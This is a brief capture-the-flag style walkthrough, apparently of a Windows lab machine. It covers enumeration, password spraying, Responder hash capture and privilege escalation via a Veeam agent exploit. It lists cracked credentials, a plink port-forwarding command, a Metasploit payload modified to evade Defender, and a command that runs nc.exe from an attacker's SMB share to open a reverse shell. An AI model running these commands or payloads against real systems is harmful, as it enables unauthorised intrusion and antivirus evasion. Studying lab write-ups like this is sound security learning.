samba and responder
open ports are 135(msrpc), 443(web https),445(samba) and 5986(wsman,winrm), 49666

samba has no public shares, web on "set", appnotes.txt mentions weak password for user
possible users:
"Max Douglas","Marjorie Adams","Nathaniel Martin","Roberta Phillips",
/assets/data/users.xml, has usernames

using '/usr/share/seclists/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt'(stupid,really?) with usernames
we get a password hit for a user,
`myrtleowe:Passw@rd`
using the lnk zip method with mslink and setting up responder, we get a hash for a user(didn't work for me, copied hash/password :/)
`MichelleWat:!!!MICKEYmouse`
after "whoami /priv" and checking local dirs, we check running processes with `get-process` and see "veeam agent" running.
checking version with (get-item Veeam.One.Agent.Service.exe).versioninfo.fileversion,but the port is only locally accessible,
so we upload "plink.exe" which uses ssh to forward ports,
`echo y|&./plink.exe -ssh -l username -pw password 2805:127.0.0.1:2805 10.17.17.11`

it has a public exploit and msf module but
defender is running and it blocks the default payloads in msf, we modify it to a custom one using x64/exec and adding a cmd option
(modified file is saved as veeam_*custom.rb)
we setup a smb server with nc.exe in dir, and set SRVHOST to tun0, RHOSTS 127.0.0.1 and the cmd(now this took a looooong time) payload to:

`net use c: \\10.17.17.11\share /user:me me&c:\nc.exe 10.17.17.11 4444 -e cmd` and this step took a lot of debugging but worked in the end,
giving us a system32 shell :)
